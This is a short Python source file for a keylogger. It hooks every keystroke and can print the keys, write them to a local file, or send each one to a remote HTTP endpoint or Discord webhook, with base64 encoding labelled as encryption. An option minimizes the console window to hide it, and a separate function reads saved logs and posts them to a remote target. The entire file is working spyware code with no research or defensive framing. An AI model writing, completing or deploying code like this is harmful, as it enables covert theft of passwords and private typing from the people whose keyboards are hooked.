import keyboard
import threading
import requests
import json
import base64
import os
import ctypes

def log_keystrokes(output='cmd', encrypt=False, stealth=False, silent=False, testing=False):
    def on_press(event):
        if output == 'cmd' and not silent:
            print(event.name, end=' ', flush=True)
        elif output == 'file':
            with open('keylog.txt', 'a') as f:
                f.write(event.name + ' ')
        elif output.startswith('http'):
            data = {'key': event.name}
            if encrypt:
                data = base64.b64encode(json.dumps(data).encode()).decode()
            requests.post(output, data=data)
        elif output.startswith('discord'):
            webhook_url = output
            data = {"content": event.name}
            requests.post(webhook_url, json=data)

    keyboard.hook(on_press)
    if testing:
        print("Keylogger started.")
    if silent:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)  # Minimize the command window
    threading.Thread(target=keyboard.wait, args=('esc',)).start()

def exfiltrate_logs(log_path, target, encrypt=False, stealth=False, silent=False, testing=False):
    try:
        with open(log_path, 'r') as f:
            logs = f.read()
        if encrypt:
            logs = base64.b64encode(logs.encode()).decode()
        if target.startswith('http'):
            requests.post(target, data={'logs': logs})
        elif target.startswith('discord'):
            webhook_url = target
            data = {"content": logs}
            requests.post(webhook_url, json=data)
        elif target == 'file':
            with open('exfiltrated_logs.txt', 'w') as f:
                f.write(logs)
        if testing:
            print(f"Logs exfiltrated to {target}")
    except Exception as e:
        if testing:
            print(f"Error exfiltrating logs: {e}")

if __name__ == "__main__":
    log_keystrokes()